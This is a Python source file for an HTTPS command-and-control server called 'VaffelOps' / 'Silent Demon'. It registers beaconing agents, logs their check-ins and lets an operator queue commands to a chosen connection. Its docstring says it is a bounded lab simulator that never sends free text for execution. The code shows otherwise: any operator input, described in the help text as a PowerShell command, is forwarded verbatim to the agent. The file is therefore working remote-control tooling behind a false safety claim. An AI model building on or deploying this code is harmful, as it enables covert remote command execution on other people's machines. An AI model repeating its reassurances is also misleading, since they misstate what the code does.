"""VaffelOps: avgrenset C2-simulator for en isolert undervisningslab.

Kjør: python collector_updated.py
Velg en forhåndsdefinert lab-handling i terminalen.
Denne serveren kjører aldri skallkommandoer og sender aldri fri tekst til kjøring.
"""
import base64
import json
import os
import queue
import threading
import uuid
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPSServer
from pathlib import Path
import time
from prompt_toolkit import prompt
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.completion import WordCompleter, NestedCompleter, DynamicCompleter
from prompt_toolkit.history import FileHistory
from prompt_toolkit import PromptSession

HOST = os.getenv("COLLECTOR_BIND", "0.0.0.0")
PORT = int(os.getenv("COLLECTOR_PORT", "5050"))
LOG = Path(__file__).resolve().parent / "collector_events.jsonl"
LAB_BEACON_INTERVAL = int(os.getenv("LAB_BEACON_INTERVAL", "1"))  # sekunder mellom forventede beacons
pending = queue.Queue()
# ww = False

def now():
    return datetime.now(timezone.utc).isoformat()

def currConnIds(server) -> dict:
        for_nested_comp = []
        for x, conn_id, y in server.connections:
            for_nested_comp.append(str(conn_id))
        return {k: None for k in for_nested_comp}
    
class Handler(BaseHTTPRequestHandler):
    
    def do_POST(self):
        if self.path != "/checkin":
            self.send_error(404)
            return
        try:
            length = int(self.headers.get("Content-Length", "0"))
            if not 0 < length <= 65536:
                raise ValueError("Invalid request size")
            data = json.loads(self.rfile.read(length))

            if not isinstance(data, dict):
                raise ValueError("Expected JSON object")
        except (ValueError, UnicodeDecodeError):
            self.send_error(400)
            return

        result = base64.b64decode(data.get("last_result")).decode("utf-8") if data.get("last_result") else None
        if result is not None:
            result = json.loads(result)

        record = {
            "received_at_utc": now(),
            "source_address": self.client_address[0],
            "host_label": data.get("host_label"),
            "event": data.get("event"),
            "last_result": result,
            "connection_id": data.get("connection_id"),
            "monotonic_time": time.monotonic()
        }
        
        key_conn = (record["host_label"], record['connection_id'], record['source_address'])
        if key_conn not in self.server.connections:
            print(f"!!!!", flush=True)
            print(f"[NY TILKOBLING] {record['host_label']} fra {record['source_address']} med monotonic_time {record['monotonic_time']}", flush=True)
            print(f"!!!!", flush=True)
            self.server.connections.append(key_conn)
            self.server.conn_ids = currConnIds(self.server)
            
        self.server.connections_beacon_times[key_conn] = time.monotonic()

        with LOG.open("a", encoding="utf-8") as f:
            f.write(json.dumps(record, ensure_ascii=False) + "\n")
        if result is not None:
            print("[RESULTAT]", flush=True)
            for key, value in result.items():
                if key == "output":
                    # match = CMD_OUTPUT_PATTERN.match(value)
                    # if match:
                    #     value = match.group(1)
                    # else:
                    #     value = "<ingen output>"
                    print(f"-------------\n{value}", flush=True)
                    if value == "dead_typeshi":
                        print(f"[DEAD] {record['host_label']} fra {record['source_address']}", flush=True)
                        if self.server.selected_connection == key_conn:
                            self.server.selected_connection = None
                            
                        self.server.connections = [c for c in self.server.connections if c != key_conn]
                        self.server.conn_ids = currConnIds(self.server)
                        if key_conn in self.server.connections_beacon_times:
                            del self.server.connections_beacon_times[key_conn]
                    continue

                print(f"  {key}: {value}", flush=True)
            
            with threading.Lock():
                self.server.ww = False
        # else:
        #     print(f"\n[BEACON] {record['host_label']} fra {record['source_address']}", flush=True)

        try:
            response = pending.get_nowait()
        except queue.Empty:
            response = {"action": "NOOP", "command_id": None}
        if response["action"] != "NOOP":
            print(f"[SENDT] {response['action']} (id={response['command_id']})", flush=True)
        body = json.dumps(response).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        return  # egne mer lesbare meldinger ovenfor


if __name__ == "__main__":
    server = ThreadingHTTPSServer((HOST, PORT), Handler, certfile="../../../../tls-test/cert.pem", keyfile="../../../../tls-test/key.pem")
    server.connections = []
    server.connections_beacon_times = {}
    server.ww = False
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"Silent Demon C2-simulator lytter på {HOST}:{PORT}")
    print(f"Hendelseslogg: {LOG}")
    timeout = LAB_BEACON_INTERVAL * 5
    def help():
        print("USAGE:")
        print("\thelp_typeshi                       - vis denne hjelpeteksten")
        print("\texit_typeshi / quit_typeshi        - avslutt programmet")
        print("\tclear_typeshi                      - tøm skjermen (clear console)")
        print(f"\ttimeout_typeshi <sekunder>        - sett tidsavbrudd for beacon-sjekk (nå {timeout})")
        print("\tconn_typeshi                       - list tilgjengelige tilkoblinger")
        print("\tconn_typeshi <connection_id>       - velg tilkobling")
        print("\t(conn mode) backup_typeshi         - stopp å snakke med valgt tilkobling")
        print("\t(conn mode) exit                   - frakoble valgt tilkobling")
        print("\t(conn mode) <handling>             - send handling til valgt tilkobling (powershell command)")
        print("\t                                     !! Kun ikke interaktive handlinger støttes !!")
        print("Conn mode betyr at du må ha valgt en tilkobling før du kan bruke handlingene.")
    help()
    session = PromptSession(history=FileHistory(".silent_demon_history"), enable_history_search=True)
    
    def beacon_timout_checker(server):
        global timeout
        import time
        while True:
            now_time = time.monotonic()
            to_remove = []
            for key, last_beacon in server.connections_beacon_times.items():
                if now_time - last_beacon > timeout:
                    print(f"[TILKOBLING TIMET UT] {key[0]} fra {key[2]} med siste monotonic_time {server.connections_beacon_times[key]}", flush=True)
                    to_remove.append(key)
            for key in to_remove:
                server.connections_beacon_times.pop(key, None)
                server.connections = [c for c in server.connections if c != key]
                server.conn_ids = currConnIds(server)
                server.selected_connection = None
            time.sleep(timeout)
    threading.Thread(target=beacon_timout_checker, args=(server,), daemon=True).start()
    
    server.conn_ids = currConnIds(server)
    
    def get_comp():
        return NestedCompleter.from_nested_dict({
            "help_typeshi": None,
            "exit_typeshi": None,
            "quit_typeshi": None,
            "clear_typeshi": None,
            "timeout_typeshi": None,
            "conn_typeshi": {
                id: None for id in server.conn_ids
            },
            "backup_typeshi": None
        })
        
    action_completer = DynamicCompleter(get_comp)

    server.selected_connection = None
    try:
        with patch_stdout():
            while True:
                while server.ww:
                    time.sleep(0.1)

                action = session.prompt(f"lab-action ({server.selected_connection if server.selected_connection else 'ingen tilkobling'})>", completer=action_completer, complete_while_typing=True, enable_history_search=True).strip()
                
            
                if action.lower() in {"exit_typeshi", "quit_typeshi"}:
                    break
                if action.lower() == "help_typeshi":
                    help()
                    continue
                if action.lower().startswith("timeout_typeshi"):
                    parts = action.split()
                    if len(parts) == 2 and parts[1].isdigit():
                        timeout = int(parts[1])
                        print(f"Tidsavbrudd for beacon-sjekk satt til {timeout} sekunder.")
                    else:
                        print(f"Bruk (timeout nå {timeout}): timeout_typeshi <sekunder>")
                    
                    continue
                
                if action.lower() == "clear_typeshi":
                    import os
                    os.system("cls" if os.name == "nt" else "clear")
                    continue
            
                if action != "" and server.selected_connection:
                    if action.lower() == "backup_typeshi":
                        server.selected_connection = None
                        print("stoppet å snakke med valgt tilkobling")
                        continue
                    elif action.lower() == "exit":
                        print("Tilkoblingen frakobles straks vent til agenten sender neste beacon.")
                        
                    command = {"action": action, "command_id": uuid.uuid4().hex[:8]}
                    pending.put(command)
                    print(f"[KØ] {action} – sendes ved neste beacon")
                    server.ww = True
                elif action and not server.selected_connection:
                    if server.connections and action.startswith("conn_typeshi"):
                        parts = action.split()
                        if len(parts) == 1:
                            print("Tilkoblinger typeshi:")
                            fmt = "{:<8}  {:<15}  {}"
                            print(fmt.format("ID", "SOURCE", "HOST"))
                            for host_label, conn_id, src_addr in server.connections:
                                print(fmt.format(conn_id, src_addr, host_label))
                        elif len(parts) == 2:
                            conn_id = parts[1]
                            for host_label, cid, src_addr in server.connections:
                                if cid == conn_id:
                                    server.selected_connection = (host_label, cid, src_addr)
                                    print(f"Valgt tilkobling: {cid} fra {src_addr} ({host_label})")
                                    break
                            else:
                                print(f"Ingen tilkobling med ID {conn_id} funnet.")
                        continue
                    print("Ingen tilkobling tilgjengelig for å sende handlingen.")
                    print("For å koble på må du først vente på at en agent sender beacon (tilkoblingsforespørsel).")
                    print("deretter kan du skrive \"conn_typeshi\" for å se tilgjengelige tilkoblinger." )
                    print("Når du ser tilgjengelige tilkoblinger, kan du velge en ved å skrive \"conn_typeshi <connection_id>\".")
            
    except (KeyboardInterrupt, EOFError):
        pass
    finally:
        server.shutdown()
        server.server_close()
